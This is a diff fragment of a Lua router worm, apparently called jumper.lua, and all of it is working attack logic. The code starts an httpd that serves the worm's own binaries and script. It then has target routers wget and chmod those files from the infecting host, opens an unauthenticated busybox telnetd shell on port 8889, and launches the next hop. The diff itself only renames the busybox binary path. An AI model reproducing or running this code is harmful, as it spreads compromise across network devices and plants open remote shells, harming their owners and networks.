@@ -614,7 +614,7 @@ local function start_worm_server()
   -- Set up directory with files the next router needs
   exec("mkdir -p /tmp/worm-serve")
   exec("cp /tmp/bin/lua /tmp/worm-serve/lua 2>/dev/null")
-  exec("cp /tmp/bin/busybox-enhanced /tmp/worm-serve/busybox 2>/dev/null")
+  exec("cp /tmp/bin/busybox /tmp/worm-serve/busybox 2>/dev/null")
 
   -- Copy self (this script)
   local self_path = arg[0] or "/tmp/jumper.lua"
@@ -628,7 +628,7 @@ local function start_worm_server()
   sleep(1)
 
   -- Start httpd
-  exec("/tmp/bin/busybox-enhanced httpd -p " .. WORM_PORT ..
+  exec("/tmp/bin/busybox httpd -p " .. WORM_PORT ..
        " -h /tmp/worm-serve -c /dev/null 2>/dev/null &")
   exec("echo $! > /tmp/worm_httpd.pid")
   sleep(1)
@@ -650,8 +650,8 @@ local function deploy_to_target(target_ip, my_ip)
   local dl_cmds = {
     "mkdir -p /tmp/bin",
     "mkdir -p /tmp/www",
-    "wget -q http://" .. my_ip .. ":" .. WORM_PORT .. "/busybox -O /tmp/bin/busybox-enhanced 2>/dev/null",
-    "chmod +x /tmp/bin/busybox-enhanced",
+    "wget -q http://" .. my_ip .. ":" .. WORM_PORT .. "/busybox -O /tmp/bin/busybox 2>/dev/null",
+    "chmod +x /tmp/bin/busybox",
     "wget -q http://" .. my_ip .. ":" .. WORM_PORT .. "/lua -O /tmp/bin/lua 2>/dev/null",
     "chmod +x /tmp/bin/lua",
     "wget -q http://" .. my_ip .. ":" .. WORM_PORT .. "/jumper.lua -O /tmp/jumper.lua 2>/dev/null",
@@ -674,7 +674,7 @@ local function deploy_to_target(target_ip, my_ip)
   -- Start BusyBox telnetd on target for better shell
   remote_exec(target_ip, TELNET_PORT,
     "export PATH=/tmp/bin:$PATH; " ..
-    "/tmp/bin/busybox-enhanced telnetd -p 8889 -l /tmp/bin/busybox-enhanced -F sh 2>/dev/null &")
+    "/tmp/bin/busybox telnetd -p 8889 -l /tmp/bin/busybox -F sh 2>/dev/null &")
   sleep(2)
 
   -- Launch the worm on target (in background, next hop)
